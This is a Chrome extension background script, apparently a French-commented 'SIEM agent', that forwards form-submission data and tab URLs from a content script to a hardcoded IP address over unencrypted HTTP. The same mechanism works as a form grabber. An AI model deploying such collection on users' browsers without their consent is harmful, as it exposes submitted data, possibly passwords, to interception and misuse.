// SIEM Agent - Background Script v2.2
// URL du serveur SIEM (MODIFIER ICI)
const SIEM_URL = 'http://87.106.98.81/';

// Envoyer le log au serveur SIEM
async function sendToSiem(log) {
  try {
    const response = await fetch(SIEM_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(log)
    });

    if (response.ok) {
      console.log('[SIEM] ✓ Envoyé:', log.id);
    } else {
      console.error('[SIEM] Erreur:', response.status);
    }
  } catch (e) {
    console.error('[SIEM] Erreur réseau:', e.message);
  }
}

// Écouter les messages du content script
chrome.runtime.onMessage.addListener((message, sender) => {
  if (message.type === 'FORM_SUBMITTED') {
    // Ajouter infos du tab
    if (sender.tab) {
      message.data.tab = {
        id: sender.tab.id,
        url: sender.tab.url
      };
    }
    sendToSiem(message.data);
  }
});

console.log('[SIEM] Agent démarré - Serveur:', SIEM_URL);
